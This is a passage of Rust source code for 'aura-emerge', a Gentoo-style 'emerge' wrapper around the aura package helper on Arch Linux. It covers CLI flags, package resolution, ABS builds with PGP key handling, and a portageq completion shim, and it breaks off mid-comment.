/*
Copyright (C) 2026 Undercat037
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

aura-emerge: A gentoo-like wrapper for the aura AUR helper.
*/

use clap::Parser;
use clap_complete::Shell;
use colored::Colorize;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::io::{self, BufRead, Write};
use std::process::{Command, Stdio};

// ── Binary paths ───────────────────────────────────────────────────────

const AURA_BIN:   &str = "/usr/bin/aura";
const PACMAN_BIN: &str = "/usr/bin/pacman";
const SUDO_BIN:   &str = "/usr/bin/sudo";
const TEE_BIN:    &str = "/usr/bin/tee";
const MV_BIN:     &str = "/usr/bin/mv";
const RM_BIN:     &str = "/usr/bin/rm";
const MAKEPKG_BIN: &str = "/usr/bin/makepkg";
const ASP_BIN: &str = "/usr/bin/asp";
const GPG_BIN: &str = "/usr/bin/gpg";
/// Keyserver used for automatic/suggested PGP key imports (--abs). Same
/// SKS-successor pool most distro tooling defaults to.
const PGP_KEYSERVER: &str = "keyserver.ubuntu.com";

/// Base URL for Arch Linux packaging repos on GitLab
const ABS_GITLAB_BASE: &str = "https://gitlab.archlinux.org/archlinux/packaging/packages";

// ── Files ─────────────────────────────────────────────────────────────────────

const WORLD_SET_FILE:  &str = "/etc/emerge/world.set";
const ABS_BUILD_BASE:  &str = "/tmp/aura-emerge-abs";
const WORLD_SET_TMP:  &str = "/etc/emerge/world.set.tmp";
const PACMAN_CONF: &str = "/etc/pacman.conf";
const MAKEPKG_CONF_SYSTEM: &str = "/etc/makepkg.conf";
const BASH_BIN: &str = "/usr/bin/bash";
const UNAME_BIN: &str = "/usr/bin/uname";

// ── CLI ───────────────────────────────────────────────────────────────────────

/// Portage-like wrapper for Arch Linux using Aura
#[derive(Parser, Debug)]
#[command(
    name = "emerge",
    bin_name = "emerge",
    version = concat!(env!("CARGO_PKG_VERSION"), " (aura-emerge)"),
    disable_help_flag = true,
    disable_version_flag = true,
)]
struct Cli {
    /// Show help information
    #[arg(short = 'h', long = "help", action = clap::ArgAction::SetTrue)]
    help: bool,

    /// Show version
    #[arg(short = 'V', long = "version", action = clap::ArgAction::SetTrue)]
    version: bool,

    /// Search for packages
    #[arg(short = 's', long)]
    search: bool,

    /// Sync package database
    #[arg(long)]
    sync: bool,

    /// Force-refresh all databases even if up to date (like pacman -Syy)
    #[arg(long)]
    refresh: bool,

    /// Update packages
    #[arg(short = 'u', long)]
    update: bool,

    /// Remove orphans
    #[arg(short = 'c', long = "depclean")]
    depclean: bool,

    /// Remove specific packages
    #[arg(short = 'C', long = "unmerge")]
    unmerge: bool,

    /// Pretend (dry run)
    #[arg(short = 'p', long = "pretend")]
    pretend: bool,

    /// Ask before applying changes
    #[arg(short = 'a', long = "ask")]
    ask: bool,

    /// Install as dependency (no world.set)
    #[arg(short = '1', long = "oneshot")]
    oneshot: bool,

    /// Explicitly force AUR only
    #[arg(long = "aur")]
    aur: bool,

    /// Only use official repos: never search or install from the AUR
    #[arg(long = "only-repos")]
    only_repos: bool,

    /// Build from ABS (Arch Build System) source
    #[arg(long = "abs")]
    abs: bool,

    /// Skip PGP signature checks when building from ABS (passes --skippgpcheck to makepkg)
    #[arg(long = "skippgp")]
    skippgp: bool,

    /// Automatically import missing PGP keys (from validpgpkeys) via a
    /// trusted keyserver before building with --abs, without prompting
    #[arg(long = "autopgp")]
    autopgp: bool,

    /// Open PKGBUILD for editing before building (ABS: opens in $EDITOR;
    /// AUR: passes aura's own --hotedit, since aura owns that build flow)
    #[arg(long = "edit")]
    edit: bool,

    /// Verbose output / detailed info in search mode (-sv = aura -Si/-Ai)
    #[arg(short = 'v', long = "verbose")]
    verbose: bool,

    /// Do not reinstall if already installed (pacman --needed)
    #[arg(short = 'n', long = "noreplace")]
    noreplace: bool,

    // Dummy flags for compatibility
    /// Consider the whole dependency tree
    #[arg(short = 'D', long = "deep")]
    deep: bool,

    /// Include installed pkgs with changed USE flags
    #[arg(short = 'N', long = "newuse")]
    newuse: bool,

    /// Reinstall all world pkgs
    #[arg(short = 'e', long = "emptytree")]
    emptytree: bool,

    /// Resume a previously interrupted merge
    #[arg(long = "resume")]
    resume: bool,

    /// Skip the first package in the resume list
    #[arg(long = "skipfirst")]
    skipfirst: bool,

    /// Remove packages not in world.set (prune)
    #[arg(long = "prune")]
    prune: bool,

    /// Regenerate package metadata cache (regen)
    #[arg(long = "regen")]
    regen: bool,

    /// Re-resolve repository prefixes for all packages in world.set
    #[arg(long = "regen-world")]
    regen_world: bool,

    /// Search package descriptions (--searchdesc)
    #[arg(long = "searchdesc")]
    searchdesc: bool,

    /// Explicitly add packages to world.set (--select)
    #[arg(long = "select")]
    select: bool,

    /// Remove packages from world.set without unmerging (--deselect)
    #[arg(long = "deselect")]
    deselect: bool,

    /// Show verbose slot/conflict info (informational)
    #[arg(long = "verbose-conflicts")]
    verbose_conflicts: bool,

    // ── Gentoo compat flags (accepted silently, no-op) ──────────────────────

    // Actions
    #[arg(long = "list-sets")]              list_sets: bool,
    #[arg(long = "metadata")]               metadata: bool,
    #[arg(long = "check-news")]             check_news: bool,
    #[arg(long = "clean")]                  clean: bool,
    #[arg(long = "config")]                 config: bool,

    // Output control
    #[arg(short = 'q', long = "quiet")]     quiet: bool,
    #[arg(long = "nospinner")]              nospinner: bool,
    #[arg(long = "noconfmem")]              noconfmem: bool,
    #[arg(long = "color")]                  color: Option<String>,
    #[arg(long = "columns")]               columns: bool,
    #[arg(long = "ignore-default-opts")]    ignore_default_opts: bool,

    // Dependency / graph control
    #[arg(short = 'O', long = "nodeps")]    nodeps: bool,
    #[arg(short = 'o', long = "onlydeps")]  onlydeps: bool,
    #[arg(short = 't', long = "tree")]      tree: bool,
    #[arg(long = "complete-graph")]         complete_graph: bool,
    #[arg(long = "changed-use")]            changed_use: bool,
    #[arg(long = "keep-going")]             keep_going: bool,
    #[arg(long = "backtrack")]              backtrack: Option<u32>,
    #[arg(long = "jobs")]                   jobs: Option<u32>,
    #[arg(long = "load-average")]           load_average: Option<f32>,
    #[arg(long = "exclude")]                exclude: Option<String>,

    // Binary pkg flags (emerge -k/-K/-g/-G/-b/-B)
    #[arg(short = 'k', long = "usepkg")]          usepkg: bool,
    #[arg(short = 'K', long = "usepkgonly")]       usepkgonly: bool,
    #[arg(short = 'g', long = "getbinpkg")]        getbinpkg: bool,
    #[arg(short = 'G', long = "getbinpkgonly")]    getbinpkgonly: bool,
    #[arg(short = 'b', long = "buildpkg")]         buildpkg: bool,
    #[arg(short = 'B', long = "buildpkgonly")]     buildpkgonly: bool,

    // Fetch flags
    #[arg(short = 'f', long = "fetchonly")]        fetchonly: bool,
    #[arg(short = 'F', long = "fetch-all-uri")]    fetch_all_uri: bool,

    // Misc compat
    #[arg(short = 'l', long = "changelog")]        changelog: bool,
    #[arg(long = "newrepo")]                        newrepo: bool,
    #[arg(long = "reinstall")]                      reinstall: Option<String>,
    #[arg(long = "quiet-build")]                    quiet_build: Option<String>,
    #[arg(long = "with-bdeps")]                     with_bdeps: Option<String>,
    #[arg(long = "alert", short = 'A')]             alert: bool,

    /// Generate a shell completion script and print it to stdout.
    /// Used by packaging (PKGBUILD) to install completions — not meant
    /// for interactive use, hence hidden from --help.
    #[arg(long = "gen-completions", hide = true, value_name = "SHELL")]
    gen_completions: Option<Shell>,

    /// Display info about the system, mirroring `emerge --info`
    #[arg(long = "info")]
    info: bool,

    /// Packages to install or '@world'
    packages: Vec<String>,
}

fn print_help() {
    println!("aura-emerge: command-line interface to the Portage system (Arch Linux)");
    println!("Usage:");
    println!("   emerge [ options ] [ action ] [ package | @set ] [ ... ]");
    println!("   emerge [ options ] [ action ] < @world >");
    println!("   emerge < --sync | --info >");
    println!("   emerge --resume [ --pretend | --ask | --skipfirst ]");
    println!("   emerge --help");
    println!("Options: -[1aCcDehNnpsuVv]");
    println!("          [ --abs                        ] [ --aur        ]");
    println!("          [ --only-repos                 ] [ --skippgp    ]");
    println!("          [ --autopgp                    ] [ --edit       ]");
    println!("          [ --deep                       ] [ --deep       ]");
    println!("          [ --emptytree                  ] [ --newuse     ]");
    println!("          [ --noreplace                  ] [ --oneshot    ]");
    println!("          [ --pretend                    ] [ --skipfirst  ]");
    println!("          [ --verbose-conflicts          ] [ --with-bdeps ]");
    println!("Actions:  [ --depclean  | --deselect | --prune      | --regen       ]");
    println!("          [ --resume    | --search   | --select     | --searchdesc  ]");
    println!("          [ --sync      | --unmerge  | --update     | --regen-world ]");
    println!("          [ --version   | --info                                    ]");
    println!();
    println!("   For more help consult the README: https://github.com/Undercat037/aura-emerge");
    println!();
    println!("Author: Undercat037");
}

// ── Validation ────────────────────────────────────────────────────────────────

fn validate_pkg(pkg: &str) -> bool {
    if pkg.starts_with('-') || pkg.contains("..") || pkg.contains("//") {
        return false;
    }
    pkg.chars()
        .all(|c| c.is_alphanumeric() || "@._+-/".contains(c))
}

fn validate_packages(packages: &[String]) -> Vec<String> {
    packages
        .iter()
        .filter(|p| {
            if !validate_pkg(p) {
                eprintln!(">>> Invalid package name (skipped): {}", p);
                false
            } else {
                true
            }
        })
        .cloned()
        .collect()
}

// ── Binary existence check ────────────────────────────────────────────────────

/// Abort early if required binaries are missing.
fn check_binaries() {
    for bin in &[AURA_BIN, PACMAN_BIN, SUDO_BIN, TEE_BIN, MV_BIN, RM_BIN] {
        if !std::path::Path::new(bin).exists() {
            eprintln!(">>> Fatal: required binary not found: {}", bin);
            std::process::exit(1);
        }
    }
}

// ── Symlink guard ─────────────────────────────────────────────────────────────

/// Returns true if the path is safe (not a symlink, or does not exist yet).
fn is_safe_path(path: &str) -> bool {
    match fs::symlink_metadata(path) {
        Ok(meta) => !meta.file_type().is_symlink(),
        Err(_) => true,
    }
}

// ── Package info ──────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
struct PkgInfo {
    name: String,
    version: String,
    repo: String,
    /// "N" new, "U" upgrade, "D" downgrade, "R" reinstall
    status: String,
}

/// Compute install status: N=new, U=upgrade, D=downgrade, R=reinstall.
fn pkg_status(name: &str, new_ver: &str) -> String {
    let out = std::process::Command::new(PACMAN_BIN)
        .args(["-Q", name])
        .env("LC_ALL", "C")
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output();
    let installed = match out {
        Ok(o) if o.status.success() => {
            let s = String::from_utf8_lossy(&o.stdout).into_owned();
            s.split_whitespace().nth(1).unwrap_or("").to_string()
        }
        _ => return "N".to_string(),
    };
    if installed.is_empty() { return "N".to_string(); }
    if installed == new_ver  { return "R".to_string(); }
    // Compare: if installed > new_ver it's a downgrade
    // Use pacman vercmp
    let cmp: i32 = std::process::Command::new("vercmp")
        .args([&installed, new_ver])
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().parse().unwrap_or(0))
        .unwrap_or(0);
    match cmp {
        c if c < 0 => "U".to_string(),
        0           => "R".to_string(),
        _           => "D".to_string(),
    }
}

/// Format package atom for display.
fn format_atom(p: &PkgInfo) -> String {
    if p.repo.is_empty() {
        format!("{}-{}", p.name, p.version)
    } else {
        format!("{}/{}-{}", p.repo, p.name, p.version)
    }
}

/// Colored status badge.
fn status_colored(status: &str) -> String {
    match status {
        "N" => status.green().bold().to_string(),
        "U" => status.yellow().bold().to_string(),
        "D" => status.red().bold().to_string(),
        _   => status.cyan().bold().to_string(),
    }
}

/// Probe official repos in a single call using --print-format.
/// Returns Some(infos) if packages are found, None otherwise.
fn probe_official(pkgs: &[String]) -> Option<Vec<PkgInfo>> {
    let mut args = vec!["-Sp", "--print-format", "%n %v", "--color", "never"];
    let pkg_refs: Vec<&str> = pkgs.iter().map(String::as_str).collect();
    args.extend_from_slice(&pkg_refs);

    let output = Command::new(AURA_BIN)
        .args(&args)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let infos: Vec<PkgInfo> = stdout
        .lines()
        .filter(|l| !l.is_empty())
        .map(|line| {
            let mut parts = line.splitn(2, ' ');
            let name = parts.next().unwrap_or("").to_string();
            let version = parts.next().unwrap_or("").to_string();
            let (repo, bare_name) = if name.contains('/') {
                let mut p = name.splitn(2, '/');
                (p.next().unwrap_or("").to_string(), p.next().unwrap_or(&name).to_string())
            } else {
                (String::new(), name.clone())
            };
            let status = pkg_status(&bare_name, &version);
            PkgInfo { name: bare_name, version, repo, status }
        })
        .collect();

    if infos.is_empty() { None } else { Some(infos) }
}

/// Probe official repos and split the requested packages into those that were
/// found (with full PkgInfo) and those that were not.
///
/// aura/pacman's `-Sp` fails (or simply omits a line) for the *whole* batch
/// query if even a single package name doesn't match anything in the sync
/// databases. Querying everything in one shot and treating a failure as
/// "nothing found" would then incorrectly push every package — including the
/// ones that DO exist officially — over to the AUR. To avoid that, we first
/// try the fast batch probe; if it doesn't account for every package we asked
/// about, we fall back to probing the missing ones individually so a single
/// bad name can't poison the rest.
fn probe_official_split(pkgs: &[String]) -> (Vec<PkgInfo>, Vec<String>) {
    let bare_of = |p: &str| p.split('/').last().unwrap_or(p).to_string();

    let mut found: Vec<PkgInfo> = Vec::new();
    let mut found_names: HashSet<String> = HashSet::new();

    if let Some(infos) = probe_official(pkgs) {
        for info in infos {
            found_names.insert(info.name.clone());
            found.push(info);
        }
    }

    // Anything the batch call didn't confirm gets re-checked one at a time.
    let unresolved: Vec<&String> = pkgs
        .iter()
        .filter(|p| !found_names.contains(&bare_of(p)))
        .collect();

    let mut missing: Vec<String> = Vec::new();
    for pkg in unresolved {
        match probe_official(std::slice::from_ref(pkg)) {
            Some(mut infos) if !infos.is_empty() => found.append(&mut infos),
            _ => missing.push(pkg.clone()),
        }
    }

    (found, missing)
}

/// Fetch AUR package info via -Ai output parsing.
fn resolve_aur(pkgs: &[String]) -> Vec<PkgInfo> {
    let mut result = Vec::new();
    for pkg in pkgs {
        let output = Command::new(AURA_BIN)
            .args(["-Ai", pkg])
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .output();

        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let mut name = pkg.clone();
            let mut version = String::from("?");
            for line in stdout.lines() {
                if line.starts_with("Name") {
                    if let Some(v) = line.split(':').nth(1) {
                        name = v.trim().to_string();
                    }
                } else if line.starts_with("Version") {
                    if let Some(v) = line.split(':').nth(1) {
                        version = v.trim().to_string();
                    }
                }
            }
            let status = pkg_status(&name, &version);
            result.push(PkgInfo { name, version, repo: "aur".to_string(), status });
        }
    }
    result
}


/// Get the repository a package was installed from (e.g. "cachyos-extra-v3", "aur").
///
/// pacman output is locale-dependent ("Repository" / "Сховище" / "Repository" etc.).
/// We force LC_ALL=C so field names are always English.
///
/// Strategy:
///   1. LC_ALL=C pacman -Qi <pkg> — local DB; knows the exact repo of the
///      installed package. No "Repository" line → AUR/foreign build.
///   2. LC_ALL=C pacman -Si <pkg> — sync DB fallback for not-yet-installed
///      packages (e.g. --select). Takes the first hit (highest-priority repo).
fn get_pkg_repo(pkg: &str) -> Option<String> {
    let bare = pkg.split('/').last().unwrap_or(pkg);

    fn pacman_c(args: &[&str]) -> Option<String> {
        let out = Command::new("/usr/bin/pacman")
            .args(args)
            .env("LC_ALL", "C")
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .output()
            .ok()?;
        if out.status.success() {
            Some(String::from_utf8_lossy(&out.stdout).into_owned())
        } else {
            None
        }
    }

    fn first_repo(stdout: &str) -> Option<String> {
        for line in stdout.lines() {
            // -Qi (C locale) uses "Installed From", -Si uses "Repository"
            if line.starts_with("Installed From") || line.starts_with("Repository") {
                if let Some(val) = line.splitn(2, ':').nth(1) {
                    let r = val.trim().to_string();
                    if !r.is_empty() { return Some(r); }
                }
            }
        }
        None
    }

    // 1. Local DB — authoritative for installed packages
    if let Some(stdout) = pacman_c(&["-Qi", bare]) {
        return first_repo(&stdout);  // None here = locally built, no repo field
    }

    // 2. Sync DB — for packages not yet installed (--select etc.)
    if let Some(stdout) = pacman_c(&["-Si", bare]) {
        return first_repo(&stdout);
    }

    None
}

/// Format package entry for world.set.
/// - Known repo (official/AUR overlay)  → "repo/name"
/// - Locally built (pacman "None")       → "forced_prefix/name" if known, else "Err/name"
/// - Not installed, not in sync DB       → bare "name"
fn pkg_world_entry(pkg: &str, forced_prefix: Option<&str>) -> String {
    let bare = pkg.split('/').last().unwrap_or(pkg);
    match get_pkg_repo(bare) {
        Some(repo) if repo != "None" => format!("{}/{}", repo, bare),
        Some(_) /* "None" = local build */ => {
            let prefix = forced_prefix.unwrap_or("Err");
            format!("{}/{}", prefix, bare)
        }
        None => bare.to_string(),
    }
}

// ── Emerge-style output ───────────────────────────────────────────────────────

fn print_emerge_plan(pkgs: &[PkgInfo]) {
    println!();
    println!("{}", "These are the packages that would be merged, in order:".green().bold());
    println!();
    println!("Calculating dependencies... done!");
    println!();
    for p in pkgs {
        if p.status == "D" {
            println!("{} {}: downgrading package!", " *".yellow().bold(), p.name.bold());
        }
        println!("[{}  {:<4} ] {}",
            "ebuild".green(),
            status_colored(&p.status),
            format_atom(p).green().bold()
        );
    }
    println!();
    println!("{}: {} package(s)", "Total".bold(), pkgs.len());
    println!();
}

fn print_emerge_emerging(pkgs: &[PkgInfo]) {
    let total = pkgs.len();
    let pfx = ">>>".green().bold();
    println!("{} Verifying ebuild manifests", pfx);
    for (i, p) in pkgs.iter().enumerate() {
        println!("{} Emerging ({} of {}) {}",
            pfx,
            (i + 1).to_string().yellow().bold(),
            total.to_string().yellow().bold(),
            format_atom(p).green().bold()
        );
    }
    println!();
}

fn print_emerge_completed(pkgs: &[PkgInfo]) {
    let total = pkgs.len();
    let pfx = ">>>".green().bold();
    for (i, p) in pkgs.iter().enumerate() {
        let atom = format_atom(p).green().bold().to_string();
        let n = (i + 1).to_string().yellow().bold().to_string();
        let t = total.to_string().yellow().bold().to_string();
        println!("{} Installing ({} of {}) {}", pfx, n, t, atom);
        println!("{} Completed  ({} of {}) {}", pfx, n, t, atom);
    }
    let tg = total.to_string().green().bold().to_string();
    println!("{} Jobs: {} of {} complete", pfx, tg, tg);
    println!();
}

// ── Command helper ────────────────────────────────────────────────────────────

fn run_cmd(prog: &str, args: &[&str], packages: &[String]) -> bool {
    let mut cmd = Command::new(prog);
    cmd.args(args);
    for p in packages {
        cmd.arg(p);
    }
    match cmd.status() {
        Ok(s) => s.success(),
        Err(e) => {
            eprintln!(">>> Execution error ({}): {}", prog, e);
            false
        }
    }
}

// ── ABS (Arch Build System) support ──────────────────────────────────────────

/// Query .SRCINFO from ABS GitLab (raw) to get pkgver without cloning.
fn abs_get_version(pkg: &str) -> String {
    // Try to fetch .SRCINFO from GitLab raw API
    let url = format!("{}/{}/raw/HEAD/.SRCINFO", ABS_GITLAB_BASE, pkg);
    let output = Command::new("curl")
        .args(["-sf", "--max-time", "5", &url])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output();

    if let Ok(out) = output {
        if out.status.success() {
            let text = String::from_utf8_lossy(&out.stdout);
            for line in text.lines() {
                let line = line.trim();
                if line.starts_with("pkgver = ") {
                    return line["pkgver = ".len()..].trim().to_string();
                }
            }
        }
    }
    "?".to_string()
}

/// Build and install packages from ABS (Arch Build System) via asp.
/// Uses `asp checkout <pkg>` to fetch the official PKGBUILD, then runs makepkg -si.
/// Extract PGP key IDs/fingerprints listed in a PKGBUILD's
/// `validpgpkeys=(...)` array. Handles multi-line arrays and either quote
/// style. Returns uppercased tokens, since gpg is case-insensitive about
/// key IDs but comparisons here are simpler kept consistent.
fn parse_validpgpkeys(pkgbuild_text: &str) -> Vec<String> {
    let mut keys = Vec::new();
    let idx = match pkgbuild_text.find("validpgpkeys=") {
        Some(i) => i,
        None => return keys,
    };
    let rest = &pkgbuild_text[idx..];
    let open = match rest.find('(') {
        Some(o) => o,
        None => return keys,
    };
    let close = match rest[open..].find(')') {
        Some(c) => open + c,
        None => return keys,
    };
    let inner = &rest[open + 1..close];

    let mut in_quote = false;
    let mut quote_char = '\'';
    let mut cur = String::new();
    for c in inner.chars() {
        if in_quote {
            if c == quote_char {
                in_quote = false;
                if !cur.is_empty() {
                    keys.push(cur.trim().to_uppercase());
                    cur.clear();
                }
            } else {
                cur.push(c);
            }
        } else if c == '\'' || c == '"' {
            in_quote = true;
            quote_char = c;
        }
    }
    keys.retain(|k| !k.is_empty());
    keys
}

/// Is this key already in the local GPG keyring?
fn gpg_key_present(key: &str) -> bool {
    Command::new(GPG_BIN)
        .args(["--list-keys", key])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

/// Parse `validpgpkeys` out of a checked-out PKGBUILD, check which of those
/// keys are missing from the local keyring, and either import them
/// automatically (`--autopgp`, from `keyserver.ubuntu.com` — a standard,
/// widely-trusted keyserver pool, not an arbitrary/attacker-controlled
/// source) or print the *exact* import command for each missing key so the
/// user isn't left guessing a key ID from a cryptic makepkg failure.
///
/// Runs proactively, before makepkg, so this catches the problem ahead of
/// time rather than reactively parsing a build failure.
fn ensure_pgp_keys(pkgbuild_path: &std::path::Path, autopgp: bool) {
    if !std::path::Path::new(GPG_BIN).exists() {
        return; // nothing we can check without gpg present
    }
    let text = match std::fs::read_to_string(pkgbuild_path) {
        Ok(t) => t,
        Err(_) => return,
    };
    let keys = parse_validpgpkeys(&text);
    if keys.is_empty() {
        return;
    }

    let missing: Vec<String> = keys.into_iter().filter(|k| !gpg_key_present(k)).collect();
    if missing.is_empty() {
        return;
    }

    if autopgp {
        println!(
            "{} Importing {} missing PGP key(s) from {}...",
            ">>>".green().bold(),
            missing.len(),
            PGP_KEYSERVER
        );
        for key in &missing {
            print!("    {} ... ", key);
            io::stdout().flush().ok();
            let ok = Command::new(GPG_BIN)
                .args(["--keyserver", PGP_KEYSERVER, "--recv-keys", key])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status()
                .map(|s| s.success())
                .unwrap_or(false);
            println!("{}", if ok { "ok".green().to_string() } else { "failed".red().to_string() });
        }
    } else {
        eprintln!();
        eprintln!(
            "{} This PKGBUILD lists {} PGP key(s) not in your keyring:",
            ">>> Note:".yellow().bold(),
            missing.len()
        );
        for key in &missing {
            eprintln!("    gpg --keyserver {} --recv-keys {}", PGP_KEYSERVER, key);
        }
        eprintln!(
            "{} Run the command(s) above, retry with --autopgp to do it automatically, \
            or --skippgp to bypass signature verification.",
            ">>>".yellow().bold()
        );
    }
}


fn abs_install(pkgs: &[String], pretend: bool, ask: bool, oneshot: bool, skippgp: bool, edit: bool, autopgp: bool) -> bool {
    for bin in &[ASP_BIN, MAKEPKG_BIN] {
        if !std::path::Path::new(bin).exists() {
            eprintln!(">>> Fatal: required binary not found: {}", bin);
            if *bin == ASP_BIN {
                eprintln!(">>> Hint: install asp with: emerge asp");
            }
            return false;
        }
    }

    let pkg_infos: Vec<PkgInfo> = pkgs.iter().filter_map(|pkg| {
        let bare = pkg.split('/').last().unwrap_or(pkg);
        if !validate_pkg(bare) || bare.contains('/') {
            eprintln!(">>> Error: invalid package name '{}' — skipping", bare);
            return None;
        }
        let version = abs_get_version(bare);

        let status = pkg_status(bare, &version);
        Some(PkgInfo { name: bare.to_string(), version, repo: "abs".to_string(), status })
    }).collect();

    if pkg_infos.is_empty() { return false; }

    println!();
    println!("{}", "These are the packages that would be merged, in order:".green().bold());
    println!();
    println!("Calculating dependencies... done!");
    println!();
    for p in &pkg_infos {
        if p.status == "D" {
            println!("{} {}: downgrading package!", " *".yellow().bold(), p.name.bold());
        }
        let atom = format!("{} (ABS)", format_atom(p));
        println!("[{}  {:<4} ] {}",
            "ebuild".green(),
            status_colored(&p.status),
            atom.green().bold()
        );
    }
    println!();
    println!("{}: {} package(s)", "Total".bold(), pkg_infos.len());
    println!();

    if pretend { return true; }

    // Clean up any stale build dir from interrupted previous run
    let build_base = std::path::PathBuf::from(ABS_BUILD_BASE);
    if build_base.exists() {
        let _ = std::fs::remove_dir_all(&build_base);
    }
    let mut all_ok = true;

    for (i, info) in pkg_infos.iter().enumerate() {
        let pfx = ">>>".green().bold();
        println!("{} Emerging ({} of {}) {} (ABS)",
            pfx,
            (i + 1).to_string().yellow().bold(),
            pkg_infos.len().to_string().yellow().bold(),
            format_atom(info).green().bold()
        );
        println!();

        let pkg_dir = build_base.join(&info.name);

        if !pkg_dir.starts_with(&build_base) {
            eprintln!(">>> Error: suspicious path for '{}' — skipping", info.name);
            all_ok = false;
            continue;
        }

        if pkg_dir.exists() {
            let _ = std::fs::remove_dir_all(&pkg_dir);
        }
        let _ = std::fs::create_dir_all(&build_base);

        println!("{} Fetching {} from ABS via asp...", ">>>".green().bold(), info.name.green().bold());
        let checkout_ok = Command::new(ASP_BIN)
            .args(["checkout", &info.name])
            .current_dir(&build_base)
            .status()
            .map(|s| s.success())
            .unwrap_or(false);

        if !checkout_ok {
            eprintln!("{} asp checkout failed for '{}'", ">>> Error:".red().bold(), info.name);
            eprintln!("{} package may not exist in ABS. Try without --abs or use --aur.", ">>> Note:".yellow().bold());
            all_ok = false;
            continue;
        }

        // asp creates <pkg>/trunk/ — that's where PKGBUILD lives
        let trunk_dir = pkg_dir.join("trunk");
        let build_dir = if trunk_dir.exists() { trunk_dir } else { pkg_dir.clone() };

        // Open PKGBUILD in $EDITOR before building if --edit is set
        if edit {
            let editor = std::env::var("EDITOR")
                .or_else(|_| std::env::var("VISUAL"))
                .unwrap_or_else(|_| "nano".to_string());
            let pkgbuild = build_dir.join("PKGBUILD");
            println!("{} Opening {} in {}...",
                ">>>".green().bold(),
                "PKGBUILD".bold(),
                editor.green().bold()
            );
            println!("{} Save and close the editor to continue building.",
                ">>>".yellow().bold()
            );
            Command::new(&editor)
                .arg(&pkgbuild)
                .status()
                .ok();
        }

        // Proactively check/import PGP keys listed in validpgpkeys before
        // even attempting the build (unless --skippgp, which makes this
        // moot).
        if !skippgp {
            ensure_pgp_keys(&build_dir.join("PKGBUILD"), autopgp);
        }

        let mut makepkg_args = vec!["-si"];
        if !ask    { makepkg_args.push("--noconfirm"); }
        if oneshot { makepkg_args.push("--asdeps"); }
        if skippgp { makepkg_args.push("--skippgpcheck"); }

        let build_ok = Command::new(MAKEPKG_BIN)
            .args(&makepkg_args)
            .current_dir(&build_dir)
            .status()
            .map(|s| s.success())
            .unwrap_or(false);

        if !build_ok {
            eprintln!("{} makepkg failed for '{}'", ">>> Error:".red().bold(), info.name);
            if !skippgp {
                eprintln!(
                    "{} if this failed on a missing PGP key not listed in validpgpkeys, \
                    find the key ID in the error above and run:",
                    ">>> Hint:".yellow().bold()
                );
                eprintln!(">>>   gpg --keyserver {} --recv-keys <key-id>", PGP_KEYSERVER);
                eprintln!(">>> Or retry with --autopgp (auto-import) or --skippgp (bypass checks).");
            }
            all_ok = false;
        }

        let _ = std::fs::remove_dir_all(&pkg_dir);
    }

    all_ok
}

// ── portageq shim ─────────────────────────────────────────────────────────────

/// Called when the binary is invoked as "portageq" (via symlink).
/// Answers fish shell completion queries so emerge.fish doesn't crash.
fn portageq_shim(args: &[String]) {
    let cmd = args.get(1).map(String::as_str).unwrap_or("");
    match cmd {
        "envvar" => {
            match args.get(2).map(String::as_str).unwrap_or("") {
                "EROOT" | "ROOT" => println!("/"),
                "PORTDIR"        => println!("/var/db/pkg"),
                "DISTDIR"        => println!("/var/cache/distfiles"),
                _                => {}
            }
        }
        "get_repos" => {
            // One dummy repo is enough; fish just needs a non-empty list
            println!("arch");
        }
        "get_repo_path" => {
            // args: eroot repo — return any existing dir
            println!("/var/db/pkg");
        }
        "get_repo_news_path" => {
            println!("/var/db/pkg");
        }
        "match_pkgs" | "best_version" => {
            let pkg = args.get(3).or_else(|| args.get(2)).map(String::as_str).unwrap_or("");
            if let Ok(out) = Command::new(PACMAN_BIN)
                .args(["-Q", pkg])
                .stdout(Stdio::piped())
                .stderr(Stdio::null())
                .output()
            {
                let s = String::from_utf8_lossy(&out.stdout);
                for line in s.lines() {
                    let mut p = line.splitn(2, ' ');
                    if let (Some(n), Some(v)) = (p.next(), p.next()) {
                        println!("{}-{}", n, v);
                    }
                }
            }
        }
        "list_repo_pkgs" => {
            if let Ok(out) = Command::new(PACMAN_BIN)
                .args(["-Ssq"])
                .stdout(Stdio::piped())
                .stderr(Stdio::null())
                .output()
            {
                print!("{}", String::from_utf8_lossy(&out.stdout));
            }
        }
        // Unknown command — exit silently so fish doesn't crash
        _ => {}
    }
}

// ── Main ──────────────────────────────────────────────────────────────────────

// ── --info ──────────────────────────────────────────────────────────────────

/// Run a command and return trimmed stdout, or None on any failure.
/// Pull the first bare `X.Y[.Z]` version token out of a string — used to
/// dig a clean version number out of `aura --version`'s output, which
/// mixes ASCII-art banner rows in with the text and isn't safe to grab a
/// whole line from.
fn extract_version_token(text: &str) -> Option<String> {
    text.split(|c: char| c.is_whitespace() || c == ',')
        .map(|tok| tok.trim_start_matches('v'))
        .find(|tok| {
            !tok.is_empty()
                && tok.chars().next().unwrap().is_ascii_digit()
                && tok.contains('.')
                && tok.chars().all(|c| c.is_ascii_digit() || c == '.')
        })
        .map(str::to_string)
}

fn cmd_stdout(bin: &str, args: &[&str]) -> Option<String> {
    let output = Command::new(bin)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
}

/// Merge /etc/makepkg.conf with the user-level override exactly the way
/// makepkg itself resolves precedence: the system file is sourced first,
/// then (if present) $XDG_CONFIG_HOME/pacman/makepkg.conf — falling back to
/// ~/.config/pacman/makepkg.conf — then the legacy ~/.makepkg.conf, each
